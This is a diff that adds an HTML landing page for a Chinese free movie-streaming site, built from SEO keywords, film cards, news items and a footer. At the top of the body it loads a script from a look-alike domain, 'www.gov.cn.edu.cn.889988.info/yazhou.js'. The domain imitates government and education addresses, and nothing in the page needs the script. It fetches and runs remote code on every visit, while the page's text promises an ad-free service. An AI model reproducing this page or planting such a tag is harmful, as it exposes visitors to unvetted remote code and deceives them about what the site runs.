@@ -1,0 +1,502 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>魔力电影网 - 最新高清影视在线观看平台 | 魔力电影网</title>
+<meta name="description" content="魔力电影网（molidianyingwang-app）是专注提供最新院线大片、经典剧集、动漫综艺的免费高清影视平台。每日更新，支持手机电脑自适应播放，无广告打扰，畅享沉浸式观影体验。">
+<meta name="keywords" content="魔力电影网, molidianyingwang-app, 高清电影在线观看, 最新电影推荐, 热门电视剧, 免费影视网站, 魔力电影网官网">
+<meta name="author" content="魔力电影网">
+<meta name="robots" content="index, follow">
+<meta name="theme-color" content="#0f0c29">
+<link rel="canonical" href="https://molidianyingwang-app.github.io">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --bg1:#0f0c29;--bg2:#302b63;--bg3:#24243e;
+  --accent:#ff3c78;--accent2:#ffd93d;--text:#f4f4f4;--muted:#a8a8c0;
+}
+html{scroll-behavior:smooth}
+body{
+  font-family:"PingFang SC","Microsoft YaHei",-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;
+  background:linear-gradient(160deg,var(--bg1),var(--bg2),var(--bg3));
+  color:var(--text);line-height:1.7;overflow-x:hidden;
+}
+a{color:inherit;text-decoration:none}
+.container{max-width:1180px;margin:0 auto;padding:0 20px}
+/* Header */
+.header{
+  position:sticky;top:0;z-index:1000;
+  background:rgba(15,12,41,.92);backdrop-filter:blur(12px);
+  border-bottom:1px solid rgba(255,255,255,.08);
+}
+.header-inner{display:flex;align-items:center;justify-content:space-between;height:64px}
+.logo{display:flex;align-items:center;gap:10px;font-size:22px;font-weight:800;letter-spacing:1px}
+.logo-mark{
+  width:36px;height:36px;border-radius:10px;
+  background:linear-gradient(135deg,var(--accent),var(--accent2));
+  display:grid;place-items:center;font-size:20px;color:#1a1a2e;font-weight:900;
+  box-shadow:0 4px 18px rgba(255,60,120,.45);
+}
+.logo-text{background:linear-gradient(90deg,#fff,var(--accent2));-webkit-background-clip:text;background-clip:text;color:transparent}
+.nav{display:flex;gap:6px}
+.nav a{
+  padding:8px 14px;border-radius:8px;font-size:14px;color:var(--muted);
+  transition:.25s;position:relative;
+}
+.nav a:hover{color:#fff;background:rgba(255,255,255,.08)}
+.menu-toggle{display:none;flex-direction:column;gap:5px;cursor:pointer;padding:6px}
+.menu-toggle span{width:24px;height:2px;background:#fff;border-radius:2px}
+/* Hero */
+.hero{padding:70px 0 60px;position:relative}
+.hero::after{
+  content:"";position:absolute;inset:0;
+  background:radial-gradient(circle at 80% 20%,rgba(255,60,120,.25),transparent 40%),
+             radial-gradient(circle at 20% 60%,rgba(255,217,61,.15),transparent 35%);
+  pointer-events:none;
+}
+.hero-grid{display:grid;grid-template-columns:1.1fr .9fr;gap:50px;align-items:center;position:relative;z-index:1}
+.hero-tag{
+  display:inline-block;padding:6px 16px;border-radius:30px;font-size:13px;
+  background:rgba(255,60,120,.15);border:1px solid rgba(255,60,120,.4);color:#ff8fa3;margin-bottom:18px;
+}
+.hero h1{font-size:clamp(30px,5vw,54px);line-height:1.15;font-weight:900;margin-bottom:16px}
+.hero h1 em{font-style:normal;background:linear-gradient(90deg,var(--accent),var(--accent2));-webkit-background-clip:text;background-clip:text;color:transparent}
+.hero p{font-size:17px;color:var(--muted);max-width:520px;margin-bottom:26px}
+.hero-actions{display:flex;gap:14px;flex-wrap:wrap}
+.btn{
+  padding:13px 30px;border-radius:12px;font-size:15px;font-weight:700;cursor:pointer;
+  border:none;transition:.3s;display:inline-flex;align-items:center;gap:8px;
+}
+.btn-primary{background:linear-gradient(135deg,var(--accent),#ff6b3d);color:#fff;box-shadow:0 8px 26px rgba(255,60,120,.4)}
+.btn-primary:hover{transform:translateY(-3px);box-shadow:0 14px 34px rgba(255,60,120,.55)}
+.btn-ghost{background:rgba(255,255,255,.07);color:#fff;border:1px solid rgba(255,255,255,.18)}
+.btn-ghost:hover{background:rgba(255,255,255,.14)}
+.hero-card{
+  background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.1);
+  border-radius:22px;padding:26px;backdrop-filter:blur(8px);
+  transform:perspective(800px) rotateY(-6deg) rotateX(4deg);
+  box-shadow:0 30px 70px rgba(0,0,0,.45);
+}
+.hero-card .poster{
+  height:200px;border-radius:14px;margin-bottom:18px;
+  background:linear-gradient(120deg,#ff3c78,#6c5ce7,#4facfe);
+  display:grid;place-items:center;font-size:44px;
+}
+.hero-card h3{font-size:19px;margin-bottom:8px}
+.hero-card .meta{font-size:13px;color:var(--muted);display:flex;gap:12px;flex-wrap:wrap;margin-bottom:14px}
+.hero-card .meta span{background:rgba(255,255,255,.08);padding:3px 10px;border-radius:20px}
+/* Section */
+.section{padding:60px 0}
+.section-head{display:flex;align-items:flex-end;justify-content:space-between;margin-bottom:32px;gap:20px;flex-wrap:wrap}
+.section-head h2{font-size:clamp(22px,3vw,32px);font-weight:800;display:flex;align-items:center;gap:12px}
+.section-head h2 i{
+  width:8px;height:30px;border-radius:6px;background:linear-gradient(var(--accent),var(--accent2));
+  display:inline-block;
+}
+.section-head a{font-size:14px;color:var(--accent2)}
+/* Cards */
+.grid{display:grid;gap:22px}
+.grid-4{grid-template-columns:repeat(4,1fr)}
+.grid-3{grid-template-columns:repeat(3,1fr)}
+.grid-2{grid-template-columns:repeat(2,1fr)}
+.film{
+  background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.07);
+  border-radius:16px;overflow:hidden;transition:.35s;cursor:pointer;
+}
+.film:hover{transform:translateY(-8px);border-color:rgba(255,60,120,.5);box-shadow:0 20px 44px rgba(0,0,0,.4)}
+.film .thumb{height:170px;position:relative;display:grid;place-items:center;font-size:38px}
+.film:nth-child(1) .thumb{background:linear-gradient(135deg,#232526,#414345)}
+.film:nth-child(2) .thumb{background:linear-gradient(135deg,#0f0c29,#302b63)}
+.film:nth-child(3) .thumb{background:linear-gradient(135deg,#3a1c71,#d76d77,#ffaf7b)}
+.film:nth-child(4) .thumb{background:linear-gradient(135deg,#134e5e,#71b280)}
+.film:nth-child(5) .thumb{background:linear-gradient(135deg,#4b1248,#f0c27b)}
+.film:nth-child(6) .thumb{background:linear-gradient(135deg,#16222a,#3a6073)}
+.film:nth-child(7) .thumb{background:linear-gradient(135deg,#ff512f,#f09819)}
+.film:nth-child(8) .thumb{background:linear-gradient(135deg,#7b4397,#dc2430)}
+.film .badge{
+  position:absolute;top:12px;left:12px;background:var(--accent);color:#fff;
+  font-size:12px;padding:3px 10px;border-radius:6px;font-weight:700;
+}
+.film .rate{
+  position:absolute;top:12px;right:12px;background:rgba(0,0,0,.6);color:var(--accent2);
+  font-size:12px;padding:3px 10px;border-radius:6px;font-weight:700;backdrop-filter:blur(4px);
+}
+.film .info{padding:16px}
+.film h4{font-size:16px;margin-bottom:8px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.film p{font-size:13px;color:var(--muted)}
+/* Feature */
+.features{display:grid;grid-template-columns:repeat(4,1fr);gap:20px}
+.feature{
+  background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.07);
+  border-radius:18px;padding:28px 22px;text-align:center;transition:.3s;
+}
+.feature:hover{background:rgba(255,60,120,.08);border-color:rgba(255,60,120,.4)}
+.feature .ico{font-size:38px;margin-bottom:14px;display:block}
+.feature h4{font-size:17px;margin-bottom:8px}
+.feature p{font-size:13px;color:var(--muted)}
+/* News */
+.news-item{
+  display:grid;grid-template-columns:120px 1fr;gap:20px;
+  padding:20px;border-bottom:1px solid rgba(255,255,255,.06);align-items:center;
+}
+.news-item:last-child{border-bottom:none}
+.news-item .date{
+  text-align:center;background:rgba(255,255,255,.05);border-radius:12px;padding:12px;
+}
+.news-item .date b{display:block;font-size:26px;color:var(--accent2);line-height:1}
+.news-item .date span{font-size:12px;color:var(--muted)}
+.news-item h4{font-size:16px;margin-bottom:6px}
+.news-item p{font-size:13px;color:var(--muted)}
+/* About */
+.about-box{
+  background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08);
+  border-radius:22px;padding:40px;
+}
+.about-box p{color:var(--muted);margin-bottom:14px;font-size:15px}
+.kw-cloud{display:flex;gap:10px;flex-wrap:wrap;margin-top:20px}
+.kw-cloud a{
+  padding:7px 16px;border-radius:30px;font-size:13px;
+  background:rgba(255,217,61,.1);border:1px solid rgba(255,217,61,.3);color:var(--accent2);
+}
+/* Footer */
+.footer{background:rgba(0,0,0,.3);border-top:1px solid rgba(255,255,255,.07);padding:50px 0 26px;margin-top:40px}
+.footer-grid{display:grid;grid-template-columns:2fr 1fr 1fr 1fr;gap:34px;margin-bottom:34px}
+.footer-col h5{font-size:16px;margin-bottom:16px;color:#fff}
+.footer-col ul{list-style:none}
+.footer-col li{margin-bottom:10px;font-size:13px;color:var(--muted)}
+.footer-col a:hover{color:var(--accent2)}
+.footer-bottom{
+  border-top:1px solid rgba(255,255,255,.07);padding-top:22px;
+  text-align:center;font-size:13px;color:var(--muted);
+}
+.footer-bottom a{color:var(--accent2);font-weight:600}
+/* Top link */
+.top-link{
+  position:fixed;right:24px;bottom:30px;width:48px;height:48px;border-radius:50%;
+  background:linear-gradient(135deg,var(--accent),var(--accent2));color:#1a1a2e;
+  display:grid;place-items:center;font-size:22px;box-shadow:0 10px 28px rgba(255,60,120,.45);
+  z-index:999;transition:.3s;
+}
+.top-link:hover{transform:scale(1.12)}
+/* Responsive */
+@media(max-width:960px){
+  .grid-4{grid-template-columns:repeat(3,1fr)}
+  .features{grid-template-columns:repeat(2,1fr)}
+  .footer-grid{grid-template-columns:1fr 1fr}
+}
+@media(max-width:768px){
+  .menu-toggle{display:flex}
+  .nav{
+    position:fixed;top:64px;left:0;right:0;flex-direction:column;
+    background:rgba(15,12,41,.98);padding:20px;gap:4px;
+    transform:translateY(-150%);transition:.4s;border-bottom:1px solid rgba(255,255,255,.08);
+  }
+  .nav.open{transform:translateY(0)}
+  .nav a{padding:14px;border-radius:10px;font-size:15px}
+  .hero-grid{grid-template-columns:1fr;gap:34px}
+  .hero-card{transform:none;max-width:420px;margin:0 auto}
+  .grid-4,.grid-3{grid-template-columns:repeat(2,1fr)}
+  .grid-2{grid-template-columns:1fr}
+  .news-item{grid-template-columns:1fr;gap:10px}
+  .section{padding:44px 0}
+}
+@media(max-width:480px){
+  .grid-4,.grid-3{grid-template-columns:1fr}
+  .features{grid-template-columns:1fr}
+  .footer-grid{grid-template-columns:1fr}
+  .hero-actions .btn{flex:1;justify-content:center}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+
+<header class="header">
+  <div class="container header-inner">
+    <a class="logo" href="#top" aria-label="魔力电影网">
+      <span class="logo-mark">魔</span>
+      <span class="logo-text">魔力电影网</span>
+    </a>
+    <nav class="nav" id="nav">
+      <a href="#hot">热映推荐</a>
+      <a href="#feature">平台优势</a>
+      <a href="#types">影视分类</a>
+      <a href="#news">影讯动态</a>
+      <a href="#about">关于我们</a>
+    </nav>
+    <div class="menu-toggle" id="toggle" aria-label="菜单">
+      <span></span><span></span><span></span>
+    </div>
+  </div>
+</header>
+
+<main id="top">
+
+  <section class="hero">
+    <div class="container hero-grid">
+      <div>
+        <span class="hero-tag">✦ 每日更新 · 高清无广告</span>
+        <h1>光影有<em>魔力</em><br>好片不期而遇</h1>
+        <p>魔力电影网（molidianyingwang-app）致力于为影迷打造纯净、流畅、免费的在线观影空间。院线新片、经典剧集、口碑动漫、综艺纪录片，一网打尽，随时随地开启你的私人影院。</p>
+        <div class="hero-actions">
+          <a class="btn btn-primary" href="#hot">立即观影 →</a>
+          <a class="btn btn-ghost" href="#types">探索片单</a>
+        </div>
+      </div>
+      <div class="hero-card">
+        <div class="poster">🎬</div>
+        <h3>本周主编推荐 · 《沉默的真相》</h3>
+        <div class="meta"><span>悬疑 / 犯罪</span><span>2026</span><span>豆瓣 9.2</span></div>
+        <p style="color:var(--muted);font-size:14px">一个关于真相与勇气的故事。光影交错之间，看见人性深处不灭的微光。魔力电影网独家高清呈现。</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目一：热映推荐 -->
+  <section class="section" id="hot">
+    <div class="container">
+      <div class="section-head">
+        <h2><i></i>热映推荐</h2>
+        <a href="#">查看全部影片 ›</a>
+      </div>
+      <div class="grid grid-4">
+        <article class="film">
+          <div class="thumb">🏙️<span class="badge">HOT</span><span class="rate">★ 9.1</span></div>
+          <div class="info">
+            <h4>城市边缘</h4>
+            <p>剧情 · 2026 · 128分钟</p>
+          </div>
+        </article>
+        <article class="film">
+          <div class="thumb">🌊<span class="badge">NEW</span><span class="rate">★ 8.7</span></div>
+          <div class="info">
+            <h4>深海回响</h4>
+            <p>科幻 · 2026 · 142分钟</p>
+          </div>
+        </article>
+        <article class="film">
+          <div class="thumb">🗡️<span class="badge">独家</span><span class="rate">★ 9.4</span></div>
+          <div class="info">
+            <h4>长安十二时辰</h4>
+            <p>古装 · 2025 · 45集</p>
+          </div>
+        </article>
+        <article class="film">
+          <div class="thumb">🚀<span class="badge">口碑</span><span class="rate">★ 8.9</span></div>
+          <div class="info">
+            <h4>星际信使</h4>
+            <p>冒险 · 2026 · 156分钟</p>
+          </div>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目二：平台优势 -->
+  <section class="section" id="feature" style="padding-top:0">
+    <div class="container">
+      <div class="section-head">
+        <h2><i></i>为什么选择魔力电影网</h2>
+        <a href="#about">了解更多 ›</a>
+      </div>
+      <div class="features">
+        <div class="feature">
+          <span class="ico">⚡</span>
+          <h4>极速流畅</h4>
+          <p>多线程智能加速，秒开即播，告别卡顿与漫长缓冲。</p>
+        </div>
+        <div class="feature">
+          <span class="ico">🖥️</span>
+          <h4>全端自适应</h4>
+          <p>手机、平板、电脑无缝切换，横竖屏自适应排版。</p>
+        </div>
+        <div class="feature">
+          <span class="ico">🎞️</span>
+          <h4>高清画质</h4>
+          <p>1080P / 4K 多清晰度可选，还原影院级视觉体验。</p>
+        </div>
+        <div class="feature">
+          <span class="ico">🚫</span>
+          <h4>纯净无广</h4>
+          <p>拒绝弹窗与恶意广告，专注为你保留纯粹的观影时光。</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目三：影视分类 -->
+  <section class="section" id="types" style="padding-top:0">
+    <div class="container">
+      <div class="section-head">
+        <h2><i></i>影视分类</h2>
+        <a href="#">全部类型 ›</a>
+      </div>
+      <div class="grid grid-3">
+        <article class="film">
+          <div class="thumb">🎭</div>
+          <div class="info">
+            <h4>剧情片</h4>
+            <p>1326 部 · 直击人心的故事</p>
+          </div>
+        </article>
+        <article class="film">
+          <div class="thumb">😂</div>
+          <div class="info">
+            <h4>喜剧片</h4>
+            <p>874 部 · 快乐无需理由</p>
+          </div>
+        </article>
+        <article class="film">
+          <div class="thumb">👽</div>
+          <div class="info">
+            <h4>科幻片</h4>
+            <p>653 部 · 想象力无边界</p>
+          </div>
+        </article>
+        <article class="film">
+          <div class="thumb">💕</div>
+          <div class="info">
+            <h4>爱情片</h4>
+            <p>921 部 · 温柔了岁月</p>
+          </div>
+        </article>
+        <article class="film">
+          <div class="thumb">🐉</div>
+          <div class="info">
+            <h4>动漫番剧</h4>
+            <p>540 部 · 二次元的浪漫</p>
+          </div>
+        </article>
+        <article class="film">
+          <div class="thumb">📺</div>
+          <div class="info">
+            <h4>热门剧集</h4>
+            <p>318 部 · 追剧不孤单</p>
+          </div>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目四：影讯动态 -->
+  <section class="section" id="news" style="padding-top:0">
+    <div class="container">
+      <div class="section-head">
+        <h2><i></i>影讯动态</h2>
+        <a href="#">更多资讯 ›</a>
+      </div>
+      <div class="about-box">
+        <div class="news-item">
+          <div class="date"><b>08</b><span>2026年10月</span></div>
+          <div>
+            <h4>《星际信使》内地定档，视效团队揭秘幕后创作</h4>
+            <p>影片历时四年打磨，实景搭建结合前沿 CGI，打造震撼太空奇观。魔力电影网将同步上线导演剪辑版。</p>
+          </div>
+        </div>
+        <div class="news-item">
+          <div class="date"><b>05</b><span>2026年10月</span></div>
+          <div>
+            <h4>金狮奖揭晓：《城市边缘》斩获最佳影片</h4>
+            <p>现实主义力作聚焦都市漂泊者，表演细腻、镜头克制，被评委誉为"近年华语电影最动人的注脚"。</p>
+          </div>
+        </div>
+        <div class="news-item">
+          <div class="date"><b>28</b><span>2026年09月</span></div>
+          <div>
+            <h4>秋季追剧指南：五部高分剧集不容错过</h4>
+            <p>从悬疑到治愈，从古装到职场，我们为你精选本季最值得投入时间的剧集清单。</p>
+          </div>
+        </div>
+        <div class="news-item">
+          <div class="date"><b>20</b><span>2026年09月</span></div>
+          <div>
+            <h4>4K 修复计划启动：百部经典老片焕新上线</h4>
+            <p>《霸王别姬》《阿飞正传》等影史经典完成 4K 数字化修复，细节纤毫毕现，重温永不褪色的光影。</p>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目五：关于我们 -->
+  <section class="section" id="about" style="padding-top:0">
+    <div class="container">
+      <div class="section-head">
+        <h2><i></i>关于魔力电影网</h2>
+      </div>
+      <div class="about-box">
+        <p><strong style="color:#fff">魔力电影网</strong>（网址：<a href="https://molidianyingwang-app.github.io" style="color:var(--accent2)">https://molidianyingwang-app.github.io</a>）是一个专注于高清影视在线免费观看的综合性电影网站。我们相信，好电影拥有穿透屏幕的魔力——它能让人大笑、落泪、沉思，也能在深夜给人力量。</p>
+        <p>平台内容涵盖<strong style="color:#fff">电影、电视剧、动漫、综艺、纪录片</strong>五大板块，每日更新最新院线资源与经典片库，支持手机端自适应播放，界面简洁、操作直观，让找片、看片变成一件轻松的事。</p>
+        <p>魔力电影网坚持"用户第一、体验至上"的初心，持续优化加载速度、画质选择与交互细节，努力成为你口袋里最可靠的那家"私人影院"。</p>
+        <div class="kw-cloud">
+          <a href="#">魔力电影网</a>
+          <a href="#">molidianyingwang-app</a>
+          <a href="#">高清电影在线观看</a>
+          <a href="#">最新电影推荐</a>
+          <a href="#">热门电视剧</a>
+          <a href="#">免费影视网站</a>
+        </div>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<footer class="footer">
+  <div class="container">
+    <div class="footer-grid">
+      <div class="footer-col">
+        <a class="logo" href="#top">
+          <span class="logo-mark">魔</span>
+          <span class="logo-text">魔力电影网</span>
+        </a>
+        <p style="color:var(--muted);font-size:13px;margin-top:14px;max-width:300px">光影有魔力，好片不期而遇。魔力电影网，你的专属在线观影伙伴。</p>
+      </div>
+      <div class="footer-col">
+        <h5>快速导航</h5>
+        <ul>
+          <li><a href="#hot">热映推荐</a></li>
+          <li><a href="#types">影视分类</a></li>
+          <li><a href="#news">影讯动态</a></li>
+          <li><a href="#about">关于我们</a></li>
+        </ul>
+      </div>
+      <div class="footer-col">
+        <h5>内容分类</h5>
+        <ul>
+          <li><a href="#">电影</a></li>
+          <li><a href="#">电视剧</a></li>
+          <li><a href="#">动漫番剧</a></li>
+          <li><a href="#">综艺纪录片</a></li>
+        </ul>
+      </div>
+      <div class="footer-col">
+        <h5>服务与支持</h5>
+        <ul>
+          <li><a href="#">观影帮助</a></li>
+          <li><a href="#">意见反馈</a></li>
+          <li><a href="#">合作洽谈</a></li>
+          <li><a href="#">免责声明</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="footer-bottom">
+      © 2026 <a href="https://molidianyingwang-app.github.io">魔力电影网（molidianyingwang-app）</a> 版权所有 · 网址：https://molidianyingwang-app.github.io · 本网站仅提供影视信息索引服务，资源版权归原作者所有
+    </div>
+  </div>
+</footer>
+
+<a class="top-link" href="#top" aria-label="回到顶部">↑</a>
+
+<script>
+document.getElementById('toggle').addEventListener('click',function(){
+  document.getElementById('nav').classList.toggle('open');
+});
+document.querySelectorAll('.nav a').forEach(function(a){
+  a.addEventListener('click',function(){document.getElementById('nav').classList.remove('open');});
+});
+</script>
+</body>
+</html>
